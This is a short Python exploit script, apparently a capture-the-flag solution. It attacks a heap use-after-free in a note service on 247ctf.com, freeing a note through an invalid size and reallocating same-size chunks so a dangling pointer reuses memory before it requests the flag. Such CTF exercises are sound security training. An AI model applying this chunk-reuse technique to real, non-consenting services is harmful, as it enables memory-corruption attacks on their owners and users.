#!/usr/bin/env python3
import socket, time

HOST = 'e9ea7c6b519c45be.247ctf.com'
PORT = 50188


def recv_until(sock, token: bytes, timeout=8.0):
    sock.settimeout(0.5)
    end = time.time()+timeout
    buf = bytearray()
    while time.time()<end:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            chunk=b''
        if chunk:
            buf+=chunk
            if token in buf:
                return bytes(buf)
        else:
            time.sleep(0.05)
    return bytes(buf)

def sendline(sock, s: str):
    sock.sendall(s.encode()+b"\n")

def make(sock, kind: str, size: int, fill: bytes=b'X'):
    sendline(sock, kind)
    recv_until(sock, f"Enter the size of your {kind} note:".encode())
    sendline(sock, str(size))
    recv_until(sock, f"Enter {kind} note data:".encode())
    # Send size-1 bytes plus one newline so fgets stays in sync
    n = max(1, size-1)
    payload = (fill*(n)).rstrip()[:n-1] + b"\n"
    sock.sendall(payload)
    recv_until(sock, b"Enter command:")

def free_via_invalid(sock, kind: str):
    sendline(sock, kind)
    recv_until(sock, f"Enter the size of your {kind} note:".encode())
    # invalid size triggers free of existing note (if any)
    sendline(sock, "-1")
    recv_until(sock, b"Enter command:")

def main():
    s = socket.create_connection((HOST, PORT), timeout=6)
    recv_until(s, b"Enter command:")

    # 1) Create small size=32 (chunk size class 0x40)
    make(s, 'small', 32, b'A')
    # 2) Free small via invalid size -> its pointer remains stored (dangling)
    free_via_invalid(s, 'small')

    # 3) Create medium same size so malloc reuses same chunk address
    make(s, 'medium', 32, b'B')
    # 4) Free medium -> pointer value remains, chunk returns to tcache
    free_via_invalid(s, 'medium')

    # 5) Create large same size so malloc reuses same chunk address
    make(s, 'large', 32, b'C')

    # 6) Verify and request flag
    sendline(s, 'print')
    out = recv_until(s, b"Enter command:")
    print(out.decode(errors='replace'))

    sendline(s, 'flag')
    flag = recv_until(s, b"Enter command:")
    print(flag.decode(errors='replace'))

if __name__ == '__main__':
    main()
